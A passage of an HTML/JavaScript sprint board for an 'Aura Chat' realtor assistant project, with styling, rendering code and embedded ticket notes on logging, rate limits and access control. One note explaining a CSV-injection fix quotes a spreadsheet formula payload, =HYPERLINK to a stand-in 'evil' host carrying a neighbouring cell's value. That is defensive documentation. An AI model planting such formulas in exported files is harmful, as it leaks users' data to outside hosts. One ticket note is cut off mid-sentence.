  }

      --ink-3: #7B818D;
      --accent: #DFAF62;
      --accent-soft: #2C2418;
      --todo: #858B96;
      --todo-bg: #23262E;
      --doing: #7BB2E6;
      --doing-bg: #16273A;
      --done: #6CC194;
      --done-bg: #142A20;
      --blocked: #E98D84;
      --blocked-bg: #331C1A;
      --shadow: 0 1px 2px rgba(0, 0, 0, .5), 0 10px 30px -20px rgba(0, 0, 0, .9);
    }
  }

  :root[data-theme="dark"] {
    --bg: #0F1116;
    --surface: #171A20;
    --surface-2: #1D2028;
    --line: #272B34;
    --line-strong: #39404C;
    --ink: #E7E8EC;
    --ink-2: #A9AEB8;
    --ink-3: #7B818D;
    --accent: #DFAF62;
    --accent-soft: #2C2418;
    --todo: #858B96;
    --todo-bg: #23262E;
    --doing: #7BB2E6;
    --doing-bg: #16273A;
    --done: #6CC194;
    --done-bg: #142A20;
    --blocked: #E98D84;
    --blocked-bg: #331C1A;
    --shadow: 0 1px 2px rgba(0, 0, 0, .5), 0 10px 30px -20px rgba(0, 0, 0, .9);
  }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    background: var(--bg);
    color: var(--ink);
    font-family: "IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
    font-size: 15px;
    line-height: 1.5;
    -webkit-font-smoothing: antialiased;
  }

  .wrap { max-width: 1080px; margin: 0 auto; padding: 0 20px 96px; }

  /* ---------- masthead ---------- */
  .masthead { padding: 40px 0 20px; }
  .eyebrow {
    font-family: "IBM Plex Mono", ui-monospace, monospace;
    font-size: 11px; letter-spacing: .14em; text-transform: uppercase;
    color: var(--accent); margin: 0 0 10px;
  }
  h1 {
    font-family: Archivo, ui-sans-serif, system-ui, sans-serif;
    font-weight: 700; font-size: clamp(30px, 5vw, 44px); line-height: 1.05;
    letter-spacing: -.02em; margin: 0 0 10px; text-wrap: balance;
  }
  .lede { color: var(--ink-2); max-width: 64ch; margin: 0; }

  .banner {
    margin: 18px 0 0; padding: 11px 14px; border-radius: var(--radius);
    background: var(--blocked-bg); color: var(--blocked);
    border: 1px solid color-mix(in srgb, var(--blocked) 35%, transparent);
    font-size: 13.5px;
  }
  .banner[hidden] { display: none; }

  /* ---------- summary ---------- */
  .summary {
    display: grid; gap: 14px; margin: 26px 0 0;
    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  }
  .stat {
    background: var(--surface); border: 1px solid var(--line);
    border-radius: var(--radius); padding: 14px 16px; box-shadow: var(--shadow);
  }
  .stat-label {
    font-family: "IBM Plex Mono", monospace; font-size: 10.5px;
    letter-spacing: .12em; text-transform: uppercase; color: var(--ink-3);
  }
  .stat-value {
    font-family: Archivo, sans-serif; font-weight: 700; font-size: 26px;
    letter-spacing: -.01em; font-variant-numeric: tabular-nums; margin-top: 2px;
  }
  .stat-sub { font-size: 12.5px; color: var(--ink-3); font-variant-numeric: tabular-nums; }

  .bar { height: 6px; border-radius: 99px; background: var(--todo-bg); overflow: hidden; margin-top: 10px; }
  .bar > i { display: block; height: 100%; background: var(--done); transition: width .35s ease; }
  .bar.accent > i { background: var(--accent); }

  /* ---------- next up ---------- */
  .nextup {
    margin: 22px 0 0; background: var(--surface); border: 1px solid var(--line);
    border-left: 3px solid var(--accent); border-radius: var(--radius);
    padding: 16px 18px; box-shadow: var(--shadow);
  }
  .nextup h2 {
    font-family: "IBM Plex Mono", monospace; font-size: 11px; letter-spacing: .14em;
    text-transform: uppercase; color: var(--accent); margin: 0 0 10px; font-weight: 600;
  }
  .nextup ol { margin: 0; padding-left: 0; list-style: none; display: grid; gap: 7px; }
  .nextup li { display: flex; gap: 10px; align-items: baseline; font-size: 14px; }
  .nextup code {
    font-family: "IBM Plex Mono", monospace; font-size: 12px; color: var(--ink-3);
    flex: 0 0 auto; min-width: 62px;
  }
  .nextup .empty { color: var(--ink-3); font-style: italic; }

  /* ---------- controls ---------- */
  .controls {
    position: sticky; top: 0; z-index: 20; margin: 26px 0 0;
    background: color-mix(in srgb, var(--bg) 97%, transparent);
    backdrop-filter: blur(8px);
    padding: 12px 0; border-bottom: 1px solid var(--line);
    display: flex; flex-wrap: wrap; gap: 10px; align-items: center;
  }
  input[type="search"] {
    flex: 1 1 200px; min-width: 160px; font: inherit; font-size: 16px;
    padding: 8px 12px; border: 1px solid var(--line-strong); border-radius: 8px;
    background: var(--surface); color: var(--ink);
  }
  input[type="search"]::placeholder { color: var(--ink-3); }
  .chips { display: flex; flex-wrap: wrap; gap: 6px; }
  .chip {
    font: inherit; font-size: 12.5px; padding: 5px 11px; cursor: pointer;
    border: 1px solid var(--line-strong); background: var(--surface);
    color: var(--ink-2); border-radius: 99px; transition: background .15s, color .15s, border-color .15s;
  }
  .chip:hover { border-color: var(--accent); color: var(--ink); }
  .chip[aria-pressed="true"] {
    background: var(--ink); color: var(--surface); border-color: var(--ink);
  }
  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }

  .saveflag {
    margin-left: auto; font-family: "IBM Plex Mono", monospace; font-size: 11px;
    letter-spacing: .08em; text-transform: uppercase; color: var(--ink-3);
    display: inline-flex; align-items: center; gap: 6px;
  }
  .saveflag::before {
    content: ""; width: 7px; height: 7px; border-radius: 99px; background: var(--ink-3);
  }
  .saveflag[data-s="saved"] { color: var(--done); }
  .saveflag[data-s="saved"]::before { background: var(--done); }
  .saveflag[data-s="saving"] { color: var(--doing); }
  .saveflag[data-s="saving"]::before { background: var(--doing); }
  .saveflag[data-s="off"] { color: var(--blocked); }
  .saveflag[data-s="off"]::before { background: var(--blocked); }

  /* ---------- epics ---------- */
  .epic { margin-top: 30px; }
  .epic-head {
    display: flex; flex-wrap: wrap; gap: 8px 14px; align-items: baseline;
    padding-bottom: 10px; border-bottom: 1px solid var(--line-strong);
  }
  .epic-key {
    font-family: "IBM Plex Mono", monospace; font-size: 11px; letter-spacing: .1em;
    color: var(--accent); text-transform: uppercase;
  }
  .epic-head h3 {
    font-family: Archivo, sans-serif; font-weight: 600; font-size: 19px;
    letter-spacing: -.01em; margin: 0; flex: 1 1 auto;
  }
  .epic-note { font-size: 12.5px; color: var(--ink-3); }
  .epic-count {
    font-family: "IBM Plex Mono", monospace; font-size: 12px; color: var(--ink-3);
    font-variant-numeric: tabular-nums;
  }

  .rows { display: grid; gap: 8px; margin-top: 12px; }
  .row {
    background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius);
    padding: 11px 14px; display: grid; gap: 4px 14px;
    grid-template-columns: 104px 1fr; align-items: start;
    box-shadow: 0 1px 1px rgba(20, 22, 28, .04);
  }
  .row[data-status="done"] { opacity: .62; }
  .row[data-status="done"] .row-title { text-decoration: line-through; text-decoration-color: var(--line-strong); }
  .row[data-status="blocked"] { border-color: color-mix(in srgb, var(--blocked) 45%, var(--line)); }
  .row[data-status="cancelled"] { opacity: .55; border-style: dashed; }
  .row[data-status="cancelled"] .row-title,
  .row[data-status="cancelled"] .row-ac { text-decoration: line-through; text-decoration-color: var(--line-strong); }

  .cell { grid-row: 1 / span 4; display: flex; flex-direction: column; gap: 5px; }

  .status {
    font: inherit; font-size: 11px; font-weight: 600;
    font-family: "IBM Plex Mono", monospace; letter-spacing: .08em; text-transform: uppercase;
    padding: 6px 8px; border-radius: 7px; cursor: pointer; text-align: center;
    border: 1px solid transparent; transition: transform .08s ease;
  }
  .status:active { transform: scale(.97); }
  .status[data-s="todo"] { background: var(--todo-bg); color: var(--todo); }
  .status[data-s="doing"] { background: var(--doing-bg); color: var(--doing); }
  .status[data-s="done"] { background: var(--done-bg); color: var(--done); }
  .status[data-s="blocked"] { background: var(--blocked-bg); color: var(--blocked); }
  .status[data-s="cancelled"] {
    background: none; color: var(--ink-3); border: 1px dashed var(--line-strong); cursor: default;
  }
  .status:disabled { cursor: default; }

  .mini {
    font: inherit; font-size: 11px; font-family: "IBM Plex Mono", monospace;
    letter-spacing: .06em; text-transform: uppercase; color: var(--ink-3);
    background: none; border: none; padding: 2px; cursor: pointer; text-align: center;
    border-radius: 5px;
  }
  .mini:hover { color: var(--blocked); }
  .mini.restore:hover { color: var(--done); }
  .mini:disabled { display: none; }

  .row-title { font-weight: 500; letter-spacing: -.005em; }
  .row-title code {
    font-family: "IBM Plex Mono", monospace; font-size: 12px; color: var(--ink-3);
    margin-right: 8px; letter-spacing: 0;
  }
  .row-ac { font-size: 13.5px; color: var(--ink-2); }
  .row-meta { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 3px; }
  .tag {
    font-family: "IBM Plex Mono", monospace; font-size: 10.5px; letter-spacing: .06em;
    text-transform: uppercase; padding: 2px 7px; border-radius: 5px;
    background: var(--surface-2); color: var(--ink-3); border: 1px solid var(--line);
  }
  .tag.p0 { color: var(--blocked); border-color: color-mix(in srgb, var(--blocked) 35%, var(--line)); }
  .tag.acc { color: var(--accent); border-color: color-mix(in srgb, var(--accent) 40%, var(--line)); }
  .tag.dep { text-transform: none; letter-spacing: 0; }

  .cancel-form { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; }
  .cancel-form input {
    flex: 1 1 220px; font: inherit; font-size: 16px; padding: 6px 10px;
    border: 1px solid var(--line-strong); border-radius: 7px;
    background: var(--surface-2); color: var(--ink);
  }
  .cancel-form button {
    font: inherit; font-size: 12.5px; padding: 5px 12px; border-radius: 7px; cursor: pointer;
    border: 1px solid var(--line-strong); background: var(--surface); color: var(--ink-2);
  }
  .cancel-form button.primary {
    background: var(--blocked); border-color: var(--blocked); color: var(--surface);
  }

  .note {
    display: flex; gap: 8px; align-items: baseline; font-size: 13px;
    color: var(--ink-2); margin-top: 4px;
  }
  .note b {
    font-family: "IBM Plex Mono", monospace; font-size: 10.5px; letter-spacing: .08em;
    text-transform: uppercase; color: var(--blocked); font-weight: 600; flex: 0 0 auto;
  }
  .note button {
    font: inherit; font-size: 12px; background: none; border: none; padding: 0;
    color: var(--ink-3); text-decoration: underline; cursor: pointer; flex: 0 0 auto;
  }
  .note button:hover { color: var(--accent); }
  .note span { text-decoration: none; }

  /* ---------- reference ---------- */
  .ref { margin-top: 44px; }
  .ref-grid { display: grid; gap: 14px; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); margin-top: 14px; }
  .card {
    background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius);
    padding: 16px 18px; box-shadow: var(--shadow);
  }
  .card h4 {
    font-family: Archivo, sans-serif; font-size: 14px; font-weight: 600; margin: 0 0 10px;
  }
  .card ul { margin: 0; padding-left: 18px; display: grid; gap: 5px; font-size: 13.5px; color: var(--ink-2); }
  .card.warn { border-left: 3px solid var(--blocked); }

  .table-scroll { overflow-x: auto; margin-top: 14px; border: 1px solid var(--line); border-radius: var(--radius); background: var(--surface); }
  table { border-collapse: collapse; width: 100%; font-size: 13.5px; }
  th, td { text-align: left; padding: 9px 14px; border-bottom: 1px solid var(--line); white-space: nowrap; }
  th {
    font-family: "IBM Plex Mono", monospace; font-size: 10.5px; letter-spacing: .1em;
    text-transform: uppercase; color: var(--ink-3); font-weight: 500;
  }
  tbody tr:last-child td { border-bottom: none; }
  td.num { font-variant-numeric: tabular-nums; font-family: "IBM Plex Mono", monospace; color: var(--accent); }

  h2.sec {
    font-family: Archivo, sans-serif; font-size: 22px; font-weight: 700;
    letter-spacing: -.015em; margin: 0;
  }
  .sec-note { color: var(--ink-2); font-size: 14px; margin: 6px 0 0; max-width: 62ch; }

  footer {
    margin-top: 44px; padding-top: 18px; border-top: 1px solid var(--line);
    font-size: 12.5px; color: var(--ink-3);
  }

  @media (max-width: 620px) {
    .row { grid-template-columns: 1fr; }
    .status { grid-row: auto; justify-self: start; padding: 5px 12px; }
    .cell { grid-row: auto; flex-direction: row; align-items: center; gap: 12px; }
    .controls { position: static; }
    .saveflag { margin-left: 0; }
  }
  @media (prefers-reduced-motion: reduce) {
    * { transition: none !important; }
  }
</style>

: {"s": "done", "note": "ai_messages with a sources column. That column is the compare-by-name fix: a follow-up now sees the real ids instead of inventing them."}, "AUR-39": {"s": "done", "note": "Server-side history keyed on conversation_id. The client sends [] once the server owns the thread; the body is still honoured for phones that have not updated. The body fallback was unreachable until fixed: a conversation created one line earlier is empty, so returning stored turns unconditionally discarded what the client sent -- an un-updated phone got no context at all, and a store blip silently emptied the shipped client's thread from the model's point of view."}, "AUR-40": {"s": "done", "note": "Filtered in SQL on every read, and owns() gates the write path separately. A borrowed id is a 404 with the same body as one that never existed. Proven against real Postgres, not just the fake."}, "AUR-88": {"s": "done", "note": "docs/aura-chat/schema.md."}, "AUR-61": {"s": "done", "note": "Reports land in the feedback table and still emit the audit log line. verdict is nullable -- a data issue reports the sheet, a thumb judges the answer."}, "AUR-83": {"s": "done", "note": "Backend, PWA, dev harness, tests and docs are all in the repo on feat/pwa. Nothing lives only on a laptop."}, "AUR-84": {"s": "done", "note": "operations.md 2 -- every variable, its default, and what breaks without it. operations.md 3 covers running it locally."}, "AUR-45": {"s": "done", "note": "Inline error with Retry. Also covers a stream that dies without a terminator, which used to hang the screen silently."}, "AUR-59": {"s": "done", "note": "Thumbs up/down under every answer. Hidden in Client Mode: the phone is turned toward a buyer and a tappable feedback control invites them to press it."}, "AUR-60": {"s": "done", "note": "All seven categories, as an enum shared by client and server -- a verify check fails if the two lists drift."}, "AUR-5": {"s": "doing", "note": "City deep links work (#city/<name> md, each with a reproduce command and the fix."}, "AUR-20": {"s": "done", "note": "Audit logging shipped. One JSON line per question on `aura.audit`: user, role, mode, conversation id, the question, the tools that ran with their result counts, tokens in/out, latency, status and error. Written in a finally, so a cancelled request still leaves a line marked incomplete. The question is logged and the answer never is -- in Realtor Mode an answer can quote commission. Plus auth-refusal lines and a per-request X-Request-Id on every response. Log locations documented in operations.md 4.2 (AUR-93)."}, "AUR-21": {"s": "done", "note": "60 questions per user per hour on /chat, 20 per IP on /login, 30 per IP on /doctor. 429 with Retry-After, which is named in expose_headers -- without that the browser reads null and a realtor refused for the next hour is told 'try again in a moment'. IP keying reads the LAST X-Forwarded-For entry, the one Railway's edge wrote: keying on the first let a rotated header buy a fresh allowance every request (20 requests, 0 refusals, against a ceiling of 3). That assumes exactly one trusted hop, so the container must never be exposed directly -- see AUR-24. The counter map is bounded by oldest-first eviction; dropping only expired entries left 15,000 live keys against a stated cap of 10,000. In memory, per process: a second replica doubles every ceiling, and that is written into operations.md rather than left to be discovered."}, "AUR-38": {"s": "done", "note": "New Chat lives inside the chats panel, first row. The header button that used to start a chat now opens the panel -- the header already carried four controls and a fifth is crowded at 375px."}, "AUR-50": {"s": "done", "note": "Slide-over panel inside #aura, not a route: the router's only chat hook is closeChat(), so a routed panel would close the chat to show the list of chats. Title, relative time, an ochre dot for client-mode threads. Empty, 503 and offline states all distinct. Reopened answers render text only -- the store keeps ids and names, never project records, and rebuilding cards from a shared slug would show a different project's price (known-issues 5)."}, "AUR-57": {"s": "done", "note": "The stored mode now round-trips. GET /conversations/{id} returns it, the client applies it before painting a turn so the header repaints ochre first, and a thread continued in a different mode updates its row. body.mode still selects the Viewer -- redaction follows what is on the screen, not what the thread used to be. The mode UPDATE is guarded on its own: it is the first write on a path that had only ever read, and letting it escape returned a null conversation_id, which made the client drop its thread id and fork the conversation."}, "AUR-62": {"s": "done", "note": "Admin-gated GET /feedback and /feedback.csv, plus an Aura Reports screen in the drawer. Gate is claims.is_admin on the service; the client asks /me rather than storing a role, because a role in localStorage is a role somebody can edit. CSV has a fixed column order so a filter built on it keeps working, and any cell that would lead with =+-@ is quoted inert -- note and question are realtor-typed and this file exists to be pasted into Sheets, so an unquoted =HYPERLINK(\"https://evil/?x\"&A1,...) arrives as a live link carrying the neighbouring cell into a URL."}, "AUR-86": {"s": "done", "note": "operations.md 2.1 -- how to change model or provider, which models qualify (tool calling is not optional), and the four-step verification after changing. Closes AUR-10 with it."}, "AUR-87": {"s": "done", "note": "docs/aura-chat/api.md -- every route, its auth, request and response shape, the SSE frame types, and the rate-limit ceilings."}, "AUR-89": {"s": "done", "note": "api.md section 2 -- all five tools, their arguments, what they read, and why redaction is not a step any of them takes."}, "AUR-90": {"s": "done", "note": "docs/aura-chat/limitations.md -- ten sections, including the ones nobody enjoys writing: dates are unreliable, Client Mode hides fields and not judgement, the benchmark is 44/50 against a bar of 47, and the real-device pass has not been run."}, "AUR-91": {"s": "done", "note": "operations.md 4.1 -- restart, what a redeploy costs (the caches and everyone's rate-limit allowance, nothing in Postgres), rollback, and the never-mint-a-new-Apps-Script-deployment rule."}, "AUR-92": {"s": "done", "note": "schema.md -- what has to be backed up and what does not, pg_dump/pg_restore through Railway's private network, and the honest note that there is no schedule yet and there should be before this holds a quarter of reports."}, "AUR-93": {"s": "done", "note": "operations.md 4.2 -- every logger, the audit line's shape, how to start from a complaint with an X-Request-Id, and a table of the common lines and what each means."}, "AUR-10": {"s": "done", "note": "Verified as part of AUR-86: the model is LLM_MODEL and nothing else, with the caveat that a model without tool calling produces confident prose about projects that do not exist."}, "AUR-82": {"s": "done", "note": "Realtors can reach it. Installed phones pick the new shell up on next launch -- sw.js is served no-cache, the worker calls skipWaiting/clients.claim, and the page reloads itself. No reinstall."}, "AUR-66": {"s": "done", "note": "Tested on a real handset by Sarath, 2026-08-25 evening: keyboard, both orientations and mobile data all behave. This was the last gate before realtors got the chat."}, "AUR-99": {"s": "done", "note": "Deployed and stable at the end of Day 2, with the handoff docs in the repo: api.md, limitations.md, schema.md, operations.md, DEPLOY.md, known-issues.md and the worklog."}}, "updated": "2026-08-25T21:00:00.000000Z"}</script>

  var ACCEPT = [
    ["Project factual accuracy", "≥ 95%"],
    ["Invented prices", "0"],

    ["50-question benchmark", "≥ 47 / 50"]
  ];

  var ORDER = ["todo", "doing", "done", "blocked"];
  var LABEL = { todo: "To do", doing: "Doing", done: "Done", blocked: "Blocked", cancelled: "Cancelled" };
  var DAYLABEL = { D1: "Day 1 · Mon", D2: "Day 2 · Tue", Post: "After P0", Future: "Future" };

  var ALL = [];
  EPICS.forEach(function (e) { e.tickets.forEach(function (t) { t.epic = e; ALL.push(t); }); });
  var BY_ID = {};
  ALL.forEach(function (t) { BY_ID[t.id] = t; });

  // ---------- shared state, carried inside the published document ----------
  var state = { v: 1, t: {}, updated: null };
  try {
    var seed = JSON.parse(document.getElementById("board-state").textContent);
    if (seed && seed.t) state = seed;
  } catch (err) { /* keep the default */ }

  var saver = null;      // artifact namespace, or null when this view cannot write
  var readOnly = false;
  var pending = null;    // debounce timer
  var flagEl = null;

  function statusOf(t) { return (state.t[t.id] && state.t[t.id].s) || "todo"; }
  function noteOf(t) { return (state.t[t.id] && state.t[t.id].note) || ""; }
  function isLive(t) { return statusOf(t) !== "cancelled"; }

  function write(t, s, note) {
    if (s === "todo" && !note) delete state.t[t.id];
    else state.t[t.id] = { s: s, note: note || "" };
    state.updated = new Date().toISOString();
    queuePublish();
  }

  function setFlag(kind, text) {
    if (!flagEl) return;
    flagEl.dataset.s = kind;
    flagEl.textContent = text;
  }

  function queuePublish() {
    if (readOnly || !saver) { renderFoot(); return; }
    setFlag("saving", "Saving…");
    clearTimeout(pending);
    pending = setTimeout(doPublish, 700); // batch rapid ticks into one publish
  }

  function doPublish() {
    var html = buildDocument();
    saver.publish(html).then(function () {
      setFlag("saved", "Saved to board");
    }).catch(function (err) {
      var code = err && err.code;
      if (code === "conflict") {
        // Someone published first; every view reloads to the winner. No retry.
        setFlag("saving", "Reloading…");
        return;
      }
      if (code === "not_granted" || code === "not_writer") {
        readOnly = true;
        setFlag("off", "View only");
        showBanner("You have view-only access to this board, so your change was not saved. Ask Sarath to share it with edit access.");
        return;
      }
      setFlag("off", "Not saved");
      showBanner("That change could not be saved (" + (code || "unknown error") + "). Your view is up to date, but the board is not — reload before relying on it.");
    });
  }

  function showBanner(msg) {
    var b = document.getElementById("banner");
    if (!b) return;
    b.textContent = msg;
    b.hidden = false;
  }

  // Rebuilds the whole document from its own source parts, with current state
  // embedded as data. Never serialises the rendered DOM.
  function buildDocument() {
    var css = document.getElementById("board-css").textContent;
    var shell = document.getElementById("board-shell").innerHTML;
    var app = document.getElementById("board-app").textContent;
    var close = "<\/script>";
    return [
      "<!doctype html>",
      "<html lang=\"en\">",
      "<head>",
      "<meta charset=\"utf-8\">",
      "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">",
      "<title>Aura Chat Sprint Board</title>",
      "<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">",
      "<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>",
      "<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap\">",
      "<style id=\"board-css\">" + css + "</style>",
      "</head>",
      "<body>",
      "<script id=\"board-state\" type=\"application/json\">" + JSON.stringify(state) + close,
      "<template id=\"board-shell\">" + shell + "</template>",
      "<div id=\"app\"></div>",
      "<script id=\"board-app\">" + app + close,
      "</body>",
      "</html>"
    ].join("\n");
  }

  // ---------- filters ----------
  var editing = null;
  var filters = { day: "all", own: "all", status: "all", q: "" };

  var FILTER_GROUPS = [
    { field: "day", opts: [["all", "All days"], ["D1", "Day 1"], ["D2", "Day 2"], ["Post", "P1"], ["Future", "P2"]] },
    { field: "own", opts: [["all", "Everyone"], ["Sarath", "Sarath"], ["Sudhanshu", "Sudhanshu"]] },
    { field: "status", opts: [["all", "Any status"], ["todo", "To do"], ["doing", "Doing"], ["done", "Done"], ["blocked", "Blocked"], ["cancelled", "Cancelled"]] }
  ];

  function matches(t) {
    if (filters.day !== "all" && t.day !== filters.day) return false;
    if (filters.own !== "all" && t.own !== filters.own && t.own !== "Both") return false;
    if (filters.status !== "all" && statusOf(t) !== filters.status) return false;
    if (filters.q) {
      var hay = (t.id + " " + t.t + " " + t.ac + " " + t.epic.name + " " + noteOf(t)).toLowerCase();
      if (hay.indexOf(filters.q) === -1) return false;
    }
    return true;
  }

  function el(tag, cls, text) {
    var n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text != null) n.textContent = text;
    return n;
  }

  function buildFilters() {
    var host = document.getElementById("filters");
    FILTER_GROUPS.forEach(function (g) {
      g.opts.forEach(function (o) {
        var b = el("button", "chip", o[1]);
        b.type = "button";
        b.dataset.field = g.field;
        b.dataset.value = o[0];
        b.setAttribute("aria-pressed", String(filters[g.field] === o[0]));
        b.addEventListener("click", function () {
          filters[g.field] = o[0];
          host.querySelectorAll(".chip").forEach(function (c) {
            c.setAttribute("aria-pressed", String(filters[c.dataset.field] === c.dataset.value));
          });
          renderBoard();
        });
        host.appendChild(b);
      });
    });
  }

  function renderSummary() {
    var host = document.getElementById("summary");
    var all = ALL.filter(function (t) { return t.pri === "P0"; });
    var counts = { todo: 0, doing: 0, done: 0, blocked: 0, cancelled: 0 };
    all.forEach(function (t) { counts[statusOf(t)]++; });
    var sprint = all.filter(isLive); // cancelled tickets leave the denominator
    var pct = sprint.length ? Math.round(counts.done / sprint.length * 100) : 0;

    function day(d) {
      var list = sprint.filter(function (t) { return t.day === d; });
      var done = list.filter(function (t) { return statusOf(t) === "done"; }).length;
      return { done: done, total: list.length, pct: list.length ? Math.round(done / list.length * 100) : 0 };
    }
    var d1 = day("D1"), d2 = day("D2");
    var scope = counts.done + " of " + sprint.length + " tickets";
    if (counts.cancelled) scope += " · " + counts.cancelled + " cancelled";

    host.innerHTML = "";
    host.appendChild(stat("P0 complete", pct + "%", scope, pct, false));
    host.appendChild(stat("Day 1 · Monday", d1.pct + "%", d1.done + " of " + d1.total, d1.pct, true));
    host.appendChild(stat("Day 2 · Tuesday", d2.pct + "%", d2.done + " of " + d2.total, d2.pct, true));
    host.appendChild(stat("In flight", String(counts.doing), counts.blocked + " blocked · " + counts.todo + " to do", null, false));
  }

  function stat(label, value, sub, pct, accent) {
    var n = el("div", "stat");
    n.appendChild(el("div", "stat-label", label));
    n.appendChild(el("div", "stat-value", value));
    n.appendChild(el("div", "stat-sub", sub));
    if (pct != null) {
      var bar = el("div", "bar" + (accent ? " accent" : ""));
      var fill = document.createElement("i");
      fill.style.width = pct + "%";
      bar.appendChild(fill);
      n.appendChild(bar);
    }
    return n;
  }

  function renderNext() {
    var host = document.getElementById("nextup");
    var rank = { D1: 0, D2: 1, Post: 2, Future: 3 };
    var ready = ALL.filter(function (t) {
      if (t.pri !== "P0") return false;
      var s = statusOf(t);
      if (s === "done" || s === "cancelled") return false;
      // a cancelled dependency is never arriving, so it no longer holds anything up
      return t.dep.every(function (d) {
        var ds = statusOf(BY_ID[d]);
        return ds === "done" || ds === "cancelled";
      });
    }).sort(function (a, b) {
      var sa = statusOf(a) === "doing" ? 0 : 1, sb = statusOf(b) === "doing" ? 0 : 1;
      if (sa !== sb) return sa - sb;
      if (rank[a.day] !== rank[b.day]) return rank[a.day] - rank[b.day];
      return parseInt(a.id.slice(4), 10) - parseInt(b.id.slice(4), 10);
    }).slice(0, 5);

    host.innerHTML = "";
    if (!ready.length) {
      host.appendChild(el("li", "empty", "No P0 ticket is ready to pick up — everything left is done, cancelled or blocked. Clear the blocked ones, then move to P1."));
      return;
    }
    ready.forEach(function (t) {
      var li = document.createElement("li");
      li.appendChild(el("code", null, t.id));
      li.appendChild(el("span", null, t.t));
      host.appendChild(li);
    });
  }

  function renderFoot() {
    var foot = document.getElementById("foot");
    if (!foot) return;
    var base = "Sarath — build owner · Sudhanshu — data and QA owner · Aura Key Realty — business owner. Ticket set derived from the Aura Chat 2-Day MVP requirements, sections 1–38.";
    if (state.updated) {
      var d = new Date(state.updated);
      base += " Board last changed " + d.toLocaleString() + ".";
    }
    foot.textContent = base;
  }

  function renderBoard() {
    var board = document.getElementById("board");
    board.innerHTML = "";

    EPICS.forEach(function (e) {
      var visible = e.tickets.filter(matches);
      if (!visible.length) return;

      var sec = el("section", "epic");
      var head = el("div", "epic-head");
      head.appendChild(el("span", "epic-key", e.key));
      head.appendChild(el("h3", null, e.name));
      if (e.note) head.appendChild(el("span", "epic-note", e.note));
      var live = e.tickets.filter(isLive);
      var done = live.filter(function (t) { return statusOf(t) === "done"; }).length;
      var count = done + "/" + live.length;
      if (live.length !== e.tickets.length) count += " · " + (e.tickets.length - live.length) + " cancelled";
      head.appendChild(el("span", "epic-count", count));
      sec.appendChild(head);

      var rows = el("div", "rows");
      visible.forEach(function (t) { rows.appendChild(renderRow(t)); });
      sec.appendChild(rows);
      board.appendChild(sec);
    });

    if (!board.children.length) {
      var none = el("p", "sec-note", "No tickets match these filters.");
      none.style.marginTop = "26px";
      board.appendChild(none);
    }

    renderSummary();
    renderNext();
    renderFoot();
  }

  function renderRow(t) {
    var s = statusOf(t);
    var row = el("div", "row");
    row.dataset.status = s;

    var cell = el("div", "cell");
    var btn = el("button", "status", LABEL[s]);
    btn.type = "button";
    btn.dataset.s = s;
    cell.appendChild(btn);

    if (s === "cancelled") {
      btn.disabled = true;
      btn.setAttribute("aria-label", t.id + " is cancelled.");
      if (!readOnly) {
        var back = el("button", "mini restore", "Restore");
        back.type = "button";
        back.addEventListener("click", function () {
          editing = null;
          write(t, "todo", "");
          renderBoard();
        });
        cell.appendChild(back);
      }
    } else {
      btn.setAttribute("aria-label", "Status of " + t.id + ": " + LABEL[s] + ". Click to advance.");
      btn.disabled = readOnly;
      btn.addEventListener("click", function () {
        write(t, ORDER[(ORDER.indexOf(statusOf(t)) + 1) % ORDER.length], "");
        renderBoard();
      });
      if (!readOnly) {
        var cancel = el("button", "mini", "Cancel");
        cancel.type = "button";
        cancel.setAttribute("aria-label", "Cancel " + t.id + " with a reason");
        cancel.addEventListener("click", function () {
          editing = (editing === t.id) ? null : t.id;
          renderBoard();
        });
        cell.appendChild(cancel);
      }
    }
    row.appendChild(cell);

    var title = el("div", "row-title");
    title.appendChild(el("code", null, t.id));
    title.appendChild(document.createTextNode(t.t));
    row.appendChild(title);

    if (t.ac) row.appendChild(el("div", "row-ac", t.ac));

    var meta = el("div", "row-meta");
    meta.appendChild(el("span", "tag " + (t.pri === "P0" ? "p0" : ""), t.pri));
    meta.appendChild(el("span", "tag", DAYLABEL[t.day]));
    meta.appendChild(el("span", "tag acc", t.own));
    if (t.dep.length) meta.appendChild(el("span", "tag dep", "needs " + t.dep.join(", ")));
    row.appendChild(meta);

    if (s === "cancelled" && editing !== t.id) {
      var note = el("div", "note");
      note.appendChild(el("b", null, "Cancelled"));
      note.appendChild(el("span", null, noteOf(t) || "No reason recorded."));
      if (!readOnly) {
        var edit = el("button", null, "Edit reason");
        edit.type = "button";
        edit.addEventListener("click", function () {
          editing = t.id;
          renderBoard();
        });
        note.appendChild(edit);
      }
      row.appendChild(note);
    }

    if (editing === t.id && !readOnly) row.appendChild(cancelForm(t, s));

    return row;
  }

  function cancelForm(t, s) {
    var form = el("form", "cancel-form");
    var input = document.createElement("input");
    input.type = "text";
    input.value = noteOf(t);
    input.placeholder = "Why is this cancelled? e.g. dropped from scope at the Monday 5pm demo";
    input.setAttribute("aria-label", "Reason for cancelling " + t.id);
    form.appendChild(input);

    var ok = el("button", "primary", s === "cancelled" ? "Save reason" : "Cancel ticket");
    ok.type = "submit";
    form.appendChild(ok);

    var back = el("button", null, "Never mind");
    back.type = "button";
    back.addEventListener("click", function () {
      editing = null;
      renderBoard();
    });
    form.appendChild(back);

    form.addEventListener("submit", function (ev) {
      ev.preventDefault();
      editing = null;
      write(t, "cancelled", input.value.trim());
      renderBoard();
    });

    setTimeout(function () { input.focus(); }, 0);
    return form;
  }

  function renderAccept() {
    var body = document.getElementById("accept");
    ACCEPT.forEach(function (r) {
      var tr = document.createElement("tr");
      tr.appendChild(el("td", null, r[0]));
      tr.appendChild(el("td", "num", r[1]));
      body.appendChild(tr);
    });
  }

  // ---------- boot ----------
  function mount() {
